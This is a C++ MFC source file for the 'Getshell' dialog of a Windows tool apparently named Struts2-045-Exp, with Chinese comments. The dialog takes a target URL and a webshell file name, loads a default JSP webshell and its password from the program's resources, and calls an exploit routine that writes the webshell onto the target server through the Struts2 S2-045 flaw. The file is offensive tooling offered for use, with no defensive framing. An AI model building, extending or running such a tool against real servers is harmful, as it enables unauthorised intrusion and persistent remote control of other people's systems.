
// Struts2-045-ExpDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "Struts2-045-Exp.h"
#include "GetshellDlg.h"
#include "afxdialogex.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// 用于应用程序“关于”菜单项的 CAboutDlg 对话框


// GetshellDlg 对话框



GetshellDlg::GetshellDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(GetshellDlg::IDD, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void GetshellDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Text(pDX, IDC_GETSHELLURL, editTextURL);
	DDX_Text(pDX, IDC_GETSHELLPATH, editTextShellName);
	DDX_Text(pDX, IDC_GETSHELLDATA, editTextShellData);
	DDX_Text(pDX, IDC_GETSHELLRESULT, editTextResult);
}

BEGIN_MESSAGE_MAP(GetshellDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDC_GETSHELL, &GetshellDlg::OnBnClickedGetshell)
END_MESSAGE_MAP()


// GetshellDlg 消息处理程序

BOOL GetshellDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// 将“关于...”菜单项添加到系统菜单中。

	// IDM_ABOUTBOX 必须在系统命令范围内。
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// 设置此对话框的图标。当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	// TODO: 在此添加额外的初始化代码

	shellDefaultName.LoadStringA(IDS_GETSHELL_DEFAULT_NAME); //从资源字符串表载入默认SHELL名
	shellDefaultData = getJspRes(IDR_JSP1); //从资源载入默认SHELL内容
	shellDefaultPwd.LoadStringA(IDS_GETSHELL_DEFAULT_PWD); //从资源字符串表载入默认SHELL密码
	editTextShellName = shellDefaultName;
	editTextShellData = shellDefaultData;
	UpdateData(false);

	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

void GetshellDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void GetshellDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR GetshellDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}

void GetshellDlg::OnBnClickedGetshell() //Getshell按钮点击事件
{
	UpdateData(true);
	CString url = editTextURL;
	url.Replace("\r",""); //删除回车，否则无法正确访问
	url.Replace("\n",""); //删除换行，否则无法正确访问
	CString shellName = editTextShellName;
	shellName.Replace("\\","/"); //分隔符统一换成 /，否则Struts2无法正确写文件
	shellName.Replace("\r",""); //删除回车，否则Struts2无法正确写文件
	shellName.Replace("\n",""); //删除换行，否则Struts2无法正确写文件
	if(url.IsEmpty()) //URL为空
	{
		MessageBox("请输入URL","错误");
		return;
	}
	if(shellName.IsEmpty()) //SHELL名字为空
	{
		MessageBox("请输入Webshell保存名","错误");
		return;
	}
	char lastChar = shellName.GetAt(shellName.GetLength()-1); //获取写入路径最后一个字符
	if(lastChar == '/' || lastChar == '\\' || lastChar == '.') //路径不正确
	{
		MessageBox("请输入正确的Webshell保存名","错误");
		return;
	}
	editTextResult = exp.getShell(url,shellName,editTextShellData);
	editTextResult += "\t默认Webshell密码: " + shellDefaultPwd;
	editTextResult.Replace("\n","\r\n"); //换行符 替换，否则CEDIT控件不能换行显示
	UpdateData(false);
}

CString GetshellDlg::getJspRes(UINT resId) //获取JSP资源
{
	CString resData;
	HMODULE hModule = GetModuleHandle(NULL);
	HRSRC hRes = FindResource(hModule,MAKEINTRESOURCE(resId),"Jsp");  
	if(hRes == NULL)
		FreeResource(hRes);
	else
	{
		HGLOBAL hglobal = LoadResource(hModule,hRes);
		if(hglobal == NULL)
			FreeResource(hglobal);
		else
			resData.Format("%s",(LPVOID)hglobal);
	}
	return resData;
}
